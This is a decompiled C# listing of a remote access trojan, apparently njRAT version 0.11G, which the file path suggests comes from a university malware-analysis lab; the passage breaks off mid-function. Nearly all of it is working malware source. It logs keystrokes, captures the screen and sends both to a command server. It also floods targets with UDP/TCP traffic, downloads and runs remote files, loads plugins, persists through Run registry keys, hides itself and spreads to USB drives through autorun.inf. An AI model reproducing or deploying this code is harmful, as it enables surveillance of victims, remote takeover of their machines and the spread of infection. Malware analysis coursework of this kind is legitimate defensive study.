// Warning: Some assembly references could not be resolved automatically. This might lead to incorrect decompilation of some parts,
// for ex. property getter/setter access. To get optimal decompilation results, please manually add the missing references to the list of loaded assemblies.

// /home/red/Documents/Politex/projects/TRIPO/lab3/malware/fff353843eb081d94aac5c048c7cbc41e62ecd476a2cbee970066199f81afdaa
// k, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// Global type: <Module>
// Entry point: k.OK.main
// Architecture: x86
// Runtime: v2.0.50727
// Hash algorithm: SHA1

using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using k.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: AssemblyVersion("0.0.0.0")]
namespace k.My
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	internal class MyApplication : ApplicationBase
	{
	}
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal class MyComputer : Computer
	{
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyComputer()
		{
		}
	}
	[StandardModule]
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	[HideModuleName]
	internal sealed class MyProject
	{
		[EditorBrowsable(EditorBrowsableState.Never)]
		[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
		internal sealed class MyWebServices
		{
			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public override bool Equals(object o)
			{
				return base.Equals(RuntimeHelpers.GetObjectValue(o));
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public override int GetHashCode()
			{
				return base.GetHashCode();
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			internal new Type GetType()
			{
				return typeof(MyWebServices);
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public override string ToString()
			{
				return base.ToString();
			}

			[DebuggerHidden]
			private static T Create__Instance__<T>(T instance) where T : new()
			{
				if (instance == null)
				{
					return new T();
				}
				return instance;
			}

			[DebuggerHidden]
			private void Dispose__Instance__<T>(ref T instance)
			{
				instance = default(T);
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public MyWebServices()
			{
			}
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[ComVisible(false)]
		internal sealed class ThreadSafeObjectProvider<T> where T : new()
		{
			[ThreadStatic]
			[CompilerGenerated]
			private static T m_ThreadStaticValue;

			internal T GetInstance
			{
				[DebuggerHidden]
				get
				{
					if (m_ThreadStaticValue == null)
					{
						m_ThreadStaticValue = new T();
					}
					return m_ThreadStaticValue;
				}
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ThreadSafeObjectProvider()
			{
			}
		}

		private static readonly ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new ThreadSafeObjectProvider<MyComputer>();

		private static readonly ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new ThreadSafeObjectProvider<MyApplication>();

		private static readonly ThreadSafeObjectProvider<User> m_UserObjectProvider = new ThreadSafeObjectProvider<User>();

		private static readonly ThreadSafeObjectProvider<MyWebServices> m_MyWebServicesObjectProvider = new ThreadSafeObjectProvider<MyWebServices>();

		[HelpKeyword("My.Computer")]
		internal static MyComputer Computer
		{
			[DebuggerHidden]
			get
			{
				return m_ComputerObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.Application")]
		internal static MyApplication Application
		{
			[DebuggerHidden]
			get
			{
				return m_AppObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.User")]
		internal static User User
		{
			[DebuggerHidden]
			get
			{
				return m_UserObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.WebServices")]
		internal static MyWebServices WebServices
		{
			[DebuggerHidden]
			get
			{
				return m_MyWebServicesObjectProvider.GetInstance;
			}
		}
	}
}
namespace k
{
	public class OK
	{
		private byte[] b;

		private TcpClient C;

		private bool Cn;

		private Computer F;

		private FileStream FS;

		private string lastcap;

		private FileInfo LO;

		private MemoryStream MeM;

		private object MT;

		private string H;

		private string P;

		private kl kq;

		private object PLG;

		private bool Cnon;

		private string PH;

		private string DR;

		private string EXE;

		private bool BD;

		private bool Idr;

		private bool IsF;

		private bool Isu;

		private string RG;

		private string sf;

		private string VN;

		private string VR;

		private string Y;

		private int klen;

		private bool Hid;

		private bool Spr;

		public OK()
		{
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Expected O, but got Unknown
			b = new byte[5121];
			C = null;
			Cn = false;
			F = new Computer();
			lastcap = "";
			LO = new FileInfo(Application.get_ExecutablePath());
			MeM = new MemoryStream();
			MT = null;
			H = "";
			P = "";
			kq = null;
			PLG = null;
			Cnon = true;
			PH = "127.0.0.1:55531,";
			DR = "TEMP";
			EXE = "server.exe";
			BD = Conversions.ToBoolean("False");
			Idr = Conversions.ToBoolean("False");
			IsF = Conversions.ToBoolean("False");
			Isu = Conversions.ToBoolean("True");
			RG = "a7c34a25f5c5b16d3a26d56c11dd4df5";
			sf = "software\\Microsoft\\Windows\\CurrentVersion\\Run";
			VN = "SGFjS2Vk";
			VR = "0.11G";
			Y = "|'|'|";
			klen = Conversions.ToInteger("20");
			Hid = Conversions.ToBoolean("False");
			Spr = Conversions.ToBoolean("False");
		}

		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		[DllImport("ntdll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int NtsetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNamesize, ref int lpVolumeserialTber, ref int lpMaximumComponentLength, ref int lpFilesystemCKs, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFilesystemNameBuffer, int nFilesystemNamesize);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextLengthA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowTextLength(long hwnd);

		[STAThread]
		public static void main()
		{
			OK oK = new OK();
			oK.Ncn();
		}

		public void Ncn()
		{
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(GTV("hp", ""), (object)"", false))))
			{
				string s = Conversions.ToString(GTV("hp", RegistryValueKind.String));
				PH = DEB(ref s);
			}
			int num = 0;
			try
			{
				string[] array = Strings.Split(PH, ",", -1, (CompareMethod)0);
				foreach (string text in array)
				{
					if (Operators.CompareString(text, "", false) != 0)
					{
						OK oK = new OK();
						if (num == 0)
						{
							oK.start(c: true, text);
						}
						else
						{
							oK.start(c: false, text);
						}
					}
					num = checked(num + 1);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				DLV("hp");
				ProjectData.ClearProjectError();
				return;
			}
			STV("hp", ENB(ref PH), RegistryValueKind.String);
		}

		public void start(bool c, string s)
		{
			try
			{
				string[] array = Strings.Split(s, ":", -1, (CompareMethod)0);
				if ((array[0].Length != 0) & (array[1].Length != 0))
				{
					H = array[0];
					P = array[1];
					Cnon = c;
					Thread thread = new Thread(ko, 1);
					thread.Start();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				DLV("hp");
				ProjectData.ClearProjectError();
			}
		}

		public void Ind(byte[] b)
		{
			string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
			byte[] array2 = null;
			checked
			{
				try
				{
					switch (array[0])
					{
					case "li":
						Cn = false;
						break;
					case "kl":
						try
						{
							Send("kl" + Y + ENB(ref kq.Logs));
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							string y = Y;
							string s = Conversions.ToString(GTV("kl", ""));
							Send("kl" + y + ENB(ref s));
							ProjectData.ClearProjectError();
						}
						break;
					case "prof":
						switch (array[1])
						{
						case "~":
							STV(array[2], array[3], RegistryValueKind.String);
							break;
						case "!":
							STV(array[2], array[3], RegistryValueKind.String);
							Send(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(string.Concat("getvalue" + Y, array[1]), Y), GTV(array[1], ""))));
							break;
						case "@":
							DLV(array[2]);
							break;
						case "$":
							try
							{
								if (array[3].Length > 0 && Operators.ConditionalCompareObjectEqual(GTV("i", ""), (object)"", false))
								{
									break;
								}
								string s = Conversions.ToString(GTV("hp", ""));
								string text2 = DEB(ref s);
								if ((text2.Length < 10) & (text2.Length == 0))
								{
									text2 = DEB(ref PH);
								}
								string[] array7 = Strings.Split(array[2], ",", -1, (CompareMethod)0);
								foreach (string text3 in array7)
								{
									if (Operators.CompareString(text3, "", false) != 0)
									{
										text2 = text2.Replace(text3 + ",", "");
										OK oK = new OK();
										oK.start(c: false, text3);
									}
								}
								text2 += array[2];
								if (array[3].Length > 0)
								{
									DLV("i");
								}
								else
								{
									STV("hp", ENB(ref text2), RegistryValueKind.String);
								}
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								DLV("hp");
								ProjectData.ClearProjectError();
							}
							break;
						}
						break;
					case "info":
					{
						array2 = (byte[])GTV(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array2.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							break;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length4 = (array[0] + Y + array[1] + Y).Length;
							memoryStream4.Write(b, length4, b.Length - length4);
							array2 = ZIP(memoryStream4.ToArray());
							STV(array[1], array2, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue3 = RuntimeHelpers.GetObjectValue(Plugin(array2, "A"));
						string[] array8 = new string[5]
						{
							"info",
							Y,
							array[1],
							Y,
							null
						};
						string[] array10 = array8;
						string s = Conversions.ToString(NewLateBinding.LateGet(objectValue3, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
						array10[4] = ENB(ref s);
						Send(string.Concat(array8));
						break;
					}
					case "ret":
					{
						array2 = (byte[])GTV(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array2.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							break;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream2 = new MemoryStream();
							int length2 = (array[0] + Y + array[1] + Y).Length;
							memoryStream2.Write(b, length2, b.Length - length2);
							array2 = ZIP(memoryStream2.ToArray());
							STV(array[1], array2, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue = RuntimeHelpers.GetObjectValue(Plugin(array2, "A"));
						string[] array8 = new string[5]
						{
							"ret",
							Y,
							array[1],
							Y,
							null
						};
						string[] array9 = array8;
						string s = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
						array9[4] = ENB(ref s);
						Send(string.Concat(array8));
						break;
					}
					case "inv":
					{
						array2 = (byte[])GTV(array[1], new byte[0]);
						if ((array[3].Length < 10) & (array2.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
							break;
						}
						if (array[3].Length > 10)
						{
							MemoryStream memoryStream3 = new MemoryStream();
							int length3 = (array[0] + Y + array[1] + Y + array[2] + Y).Length;
							memoryStream3.Write(b, length3, b.Length - length3);
							array2 = ZIP(memoryStream3.ToArray());
							STV(array[1], array2, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue2 = RuntimeHelpers.GetObjectValue(Plugin(array2, "A"));
						NewLateBinding.LateSet(objectValue2, (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(objectValue2, (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(objectValue2, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(objectValue2, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						while (!Conversions.ToBoolean(Operators.OrObject((object)(!Cn), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue2, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
						{
							Thread.Sleep(1);
						}
						NewLateBinding.LateSet(objectValue2, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
						break;
					}
					case "CAP":
					{
						int width = Screen.get_PrimaryScreen().get_Bounds().Width;
						Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap bitmap = new Bitmap(width, rectangle.Height);
						Graphics graphics = Graphics.FromImage(bitmap);
						Size blockRegionSize = new Size(bitmap.Width, bitmap.Height);
						graphics.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
						try
						{
							Cursor @default = Cursors.get_Default();
							Point position = Cursor.get_Position();
							blockRegionSize = new Size(32, 32);
							rectangle = new Rectangle(position, blockRegionSize);
							@default.Draw(graphics, rectangle);
						}
						catch (Exception ex5)
						{
							ProjectData.SetProjectError(ex5);
							Exception ex6 = ex5;
							ProjectData.ClearProjectError();
						}
						graphics.Dispose();
						MemoryStream memoryStream5 = new MemoryStream();
						string s = "CAP" + Y;
						b = SB(ref s);
						memoryStream5.Write(b, 0, b.Length);
						EncoderParameters encoderParameters = new EncoderParameters(1);
						encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
						ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
						MemoryStream memoryStream6 = new MemoryStream();
						IntPtr callbackData = default(IntPtr);
						bitmap.GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), null, callbackData).Save(memoryStream6, encoderInfo, encoderParameters);
						memoryStream5.Write(memoryStream6.ToArray(), 0, (int)memoryStream6.Length);
						Sendb(memoryStream5.ToArray());
						memoryStream5.Dispose();
						memoryStream6.Dispose();
						bitmap.Dispose();
						break;
					}
					case "un":
						switch (array[1])
						{
						case "~":
							UNS();
							break;
						case "!":
							pr(0);
							ProjectData.EndApp();
							break;
						case "@":
							pr(0);
							Process.Start(LO.FullName);
							ProjectData.EndApp();
							break;
						}
						break;
					case "Ex":
					{
						if (PLG == null)
						{
							Send("PLG");
							int num3 = 0;
							while (unchecked(PLG == null || num3 == 20) | !Cn)
							{
								num3++;
								Thread.Sleep(1000);
							}
							if ((PLG == null) | !Cn)
							{
								return;
							}
						}
						object pLG = PLG;
						object[] array4 = new object[1] { b };
						object[] array5 = array4;
						bool[] array6 = new bool[1] { true };
						NewLateBinding.LateCall(pLG, (Type)null, "ind", array5, (string[])null, (Type[])null, array6, true);
						if (array6[0])
						{
							b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(byte[]));
						}
						break;
					}
					case "PLG":
					{
						MemoryStream memoryStream = new MemoryStream();
						int length = (array[0] + Y).Length;
						memoryStream.Write(b, length, b.Length - length);
						PLG = RuntimeHelpers.GetObjectValue(Plugin(ZIP(memoryStream.ToArray()), "A"));
						NewLateBinding.LateSet(PLG, (Type)null, "H", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(PLG, (Type)null, "P", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(PLG, (Type)null, "c", new object[1] { C }, (string[])null, (Type[])null);
						break;
					}
					case "DOS":
					{
						int num = 0;
						int num2 = 0;
						string text = array[7];
						DateTime t = DateTime.Now.AddSeconds(Conversions.ToDouble(array[5]));
						while (true)
						{
							num2++;
							if ((double)num2 == Conversions.ToDouble(array[6]))
							{
								num2 = 0;
								try
								{
									IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(array[1]), Conversions.ToInteger(array[2]));
									if (Operators.CompareString(array[3], "UDP", false) == 0)
									{
										byte[] array3 = new byte[0];
										array3 = Encoding.ASCII.GetBytes(text);
										Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
										socket.Connect(remoteEP);
										socket.SendTo(array3, remoteEP);
										text += text;
									}
									else if (Operators.CompareString(array[3], "TCP", false) == 0)
									{
										Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
										socket2.Connect(remoteEP);
										socket2.Close();
									}
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									text = array[7];
									ProjectData.ClearProjectError();
								}
							}
							if (DateTime.Compare(DateTime.Now, t) > 0)
							{
								break;
							}
							num++;
							Thread.Sleep(Conversions.ToInteger(array[4]));
						}
						break;
					}
					}
					if (!((Operators.CompareString(array[0], "rn", false) == 0) | (Operators.CompareString(array[0], "up", false) == 0) | (Operators.CompareString(array[0], "rp", false) == 0) | (Operators.CompareString(array[0], "rps", false) == 0)))
					{
						return;
					}
					if (!array[1].ToLower().StartsWith("http"))
					{
						try
						{
							MemoryStream memoryStream7 = new MemoryStream();
							int length5 = (array[0] + Y + array[1] + Y).Length;
							memoryStream7.Write(b, length5, b.Length - length5);
							array2 = ZIP(memoryStream7.ToArray());
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							if (Operators.CompareString(array[0], "rn", false) == 0)
							{
								Send("MSG" + Y + "Execute ERROR");
							}
							else
							{
								Send("MSG" + Y + "Update ERROR");
							}
							Send("bla");
							ProjectData.ClearProjectError();
							return;
						}
					}
					else
					{
						try
						{
							array2 = (byte[])Versioned.CallByName((object)new WebClient(), "Downiata".Replace("i", "loadD"), (CallType)1, new object[1] { array[2] });
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							if (Operators.CompareString(array[0], "rn", false) == 0)
							{
								Send("MSG" + Y + "Execute ERROR");
							}
							else
							{
								Send("MSG" + Y + "Update ERROR");
							}
							Send("bla");
							ProjectData.ClearProjectError();
							return;
						}
					}
					Send("bla");
					string text4 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(text4, array2);
						if (Operators.CompareString(array[0], "rn", false) == 0)
						{
							Process.Start(text4);
							Send("MSG" + Y + "Executed As " + new FileInfo(text4).get_Name());
							return;
						}
						Send("MSG" + Y + "Updating To " + new FileInfo(text4).get_Name());
						Thread.Sleep(2000);
						Process.Start(text4, "..");
						UNS();
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception ex8 = ex7;
						if (Operators.CompareString(array[0], "rn", false) == 0)
						{
							Send("MSG" + Y + "Execute ERROR " + ex8.Message);
						}
						else
						{
							Send("MSG" + Y + "Update ERROR " + ex8.Message);
						}
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9);
					Exception ex10 = ex9;
					if (((array.Length > 0 && Operators.CompareString(array[0], "Ex", false) == 0) ? true : false) | (Operators.CompareString(array[0], "PLG", false) == 0))
					{
						PLG = null;
					}
					try
					{
						Send("ER" + Y + array[0] + Y + ex10.Message);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}

		public ImageCodecInfo GetEncoderInfo(string M)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = imageEncoders.Length;
			for (int i = 0; i <= num; i = checked(i + 1))
			{
				if (Operators.CompareString(imageEncoders[i].MimeType, M, false) == 0)
				{
					return imageEncoders[i];
				}
			}
			return null;
		}

		public void ko()
		{
			checked
			{
				if (Cnon)
				{
					STV("i", "!", RegistryValueKind.String);
					if (Interaction.Command() != null)
					{
						try
						{
							((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "!");
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						Thread.Sleep(5000);
					}
					bool createdNew = false;
					MT = new Mutex(initiallyOwned: true, RG + VN, out createdNew);
					if (!createdNew)
					{
						ProjectData.EndApp();
					}
					INS();
					if (!Idr)
					{
						EXE = LO.get_Name();
						DR = LO.Directory!.get_Name();
					}
					Thread thread = new Thread(RC, 1);
					thread.Start();
					kq = new kl();
					kq.RG = RG;
					kq.Klen = klen;
					Thread thread2 = new Thread(kq.WRK, 1);
					thread2.Start();
					string text = "";
					if (BD)
					{
						try
						{
							SystemEvents.SessionEnding += delegate
							{
								ED();
							};
							pr(1);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					int num = default(int);
					int num2 = default(int);
					while (true)
					{
						Thread.Sleep(1000);
						if (!Cn)
						{
							text = "";
						}
						Application.DoEvents();
						num++;
						num2++;
						try
						{
							if (num2 == 5)
							{
								num2 = 0;
								try
								{
									Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
								}
							}
							if (num != 8)
							{
								continue;
							}
							num = 0;
							string text2 = ACT();
							if (text2.Length > 0)
							{
								Send("act" + Y + text2);
							}
							if (Isu)
							{
								try
								{
									((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
								}
								catch (Exception projectError4)
								{
									ProjectData.SetProjectError(projectError4);
									ProjectData.ClearProjectError();
								}
								try
								{
									((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
								}
								catch (Exception projectError5)
								{
									ProjectData.SetProjectError(projectError5);
									ProjectData.ClearProjectError();
								}
							}
							if (Spr)
							{
								USBspr(use: true);
							}
							if (Hid)
							{
								try
								{
									FileSystem.SetAttr(LO.FullName, (FileAttribute)2);
								}
								catch (Exception projectError6)
								{
									ProjectData.SetProjectError(projectError6);
									ProjectData.ClearProjectError();
								}
								try
								{
									FileSystem.SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", (FileAttribute)2);
								}
								catch (Exception projectError7)
								{
									ProjectData.SetProjectError(projectError7);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
					}
				}
				Thread thread3 = new Thread(RC, 1);
				thread3.Start();
				int num3 = 0;
				while (true)
				{
					Thread.Sleep(1000);
					try
					{
						if (num3 == 8)
						{
							num3 = 0;
							string text3 = ACT();
							if (text3.Length > 0)
							{
								Send("act" + Y + text3);
							}
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
				}
			}
		}

		public void USBspr(bool use)
		{
			checked
			{
				try
				{
					if (use)
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_UsER\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"0", RegistryValueKind.DWord);
						string[] logicalDrives = Environment.GetLogicalDrives();
						int num = logicalDrives.Length - 1;
						for (int i = 0; i <= num; i++)
						{
							DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
							if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady && !File.Exists(logicalDrives[i] + RG + ".exe"))
							{
								File.Copy(Application.get_ExecutablePath(), logicalDrives[i] + RG + ".exe", overwrite: true);
								((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(logicalDrives[i] + "autorun.inf", "[autorun]\r\nopen=" + logicalDrives[i] + RG + ".exe\r\nshellexecute=" + logicalDrives[i], true);
								FileSystem.SetAttr(logicalDrives[i] + RG + ".exe", (FileAttribute)2);
								FileSystem.SetAttr(logicalDrives[i] + "autorun.inf", (FileAttribute)2);
							}
						}
						return;
					}
					string[] logicalDrives2 = Environment.GetLogicalDrives();
					int num2 = logicalDrives2.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						DriveInfo driveInfo2 = new DriveInfo(logicalDrives2[j]);
						if (driveInfo2.DriveType == DriveType.Removable && driveInfo2.IsReady && File.Exists(logicalDrives2[j] + RG + ".exe"))
						{
							FileSystem.SetAttr(logicalDrives2[j] + RG + ".exe", (FileAttribute)0);
							FileSystem.SetAttr(logicalDrives2[j] + "autorun.inf", (FileAttribute)0);
							File.Delete(logicalDrives2[j] + RG + ".exe");
							File.Delete(logicalDrives2[j] + "autorun.inf");
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}

		public string ACT()
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					return "";
				}
				string WinTitle = Strings.Space(checked(GetWindowTextLength((long)foregroundWindow) + 1));
				GetWindowText(foregroundWindow, ref WinTitle, WinTitle.Length);
				return ENB(ref WinTitle);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string BS(ref byte[] B)
		{
			return Encoding.UTF8.GetString(B);
		}

		public bool Cam()
		{
			checked
			{
				try
				{
					int num = 0;
					do
					{
						short wDriver = (short)num;
						string lpszName = Strings.Space(100);
						string lpszVer = null;
						if (capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
						{
							return true;
						}
						num++;
					}
					while (num <= 4);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return false;
			}
		}

		public bool CompDir(FileInfo F1, FileInfo F2)
		{
			if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) == 0)
			{
				DirectoryInfo directoryInfo = F1.Directory;
				DirectoryInfo directoryInfo2 = F2.Directory;
				do
				{
					if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) != 0)
					{
						return false;
					}
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (directoryInfo == null && directoryInfo2 == null)
					{
						return true;
					}
					if (directoryInfo == null)
					{
						return false;
					}
				}
				while (directoryInfo2 != null);
			}
			return false;
		}

		public bool connect()
		{
			Cn = false;
			Thread.Sleep(2000);
			FileInfo lO = LO;
			lock (lO)
			{
				try
				{
					if (C != null)
					{
						try
						{
							C.Close();
							C = null;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					try
					{
						MeM.Dispose();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					MeM = new MemoryStream();
					C = new TcpClient();
					C.ReceiveBufferSize = 204800;
					C.SendBufferSize = 204800;
					C.Client.SendTimeout = 10000;
					C.Client.ReceiveTimeout = 10000;
					C.Connect(H, Conversions.ToInteger(P));
					Cn = true;
					Send(inf());
					try
					{
						string text = "";
						if (Operators.ConditionalCompareObjectEqual(GTV("vn", ""), (object)"", false))
						{
							text = text + DEB(ref VN) + ",";
						}
						else
						{
							string text2 = text;
							string s = Conversions.ToString(GTV("vn", ""));
							text = text2 + DEB(ref s) + ",";
						}
						text = text + H + ":" + P + ",";
						text = text + DR + ",";
						text = text + EXE + ",";
						text = text + Conversions.ToString(Idr) + ",";
						text = text + Conversions.ToString(IsF) + ",";
						text = text + Conversions.ToString(Isu) + ",";
						text = text + Conversions.ToString(BD) + ",";
						text = text + Conversions.ToString(Hid) + ",";
						text = text + Conversions.ToString(Spr) + ",";
						Send("infn" + Y + ENB(ref text));
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Cn = false;
					ProjectData.ClearProjectError();
				}
			}
			return Cn;
		}

		public string DEB(ref string s)
		{
			byte[] B = Convert.FromBase64String(s);
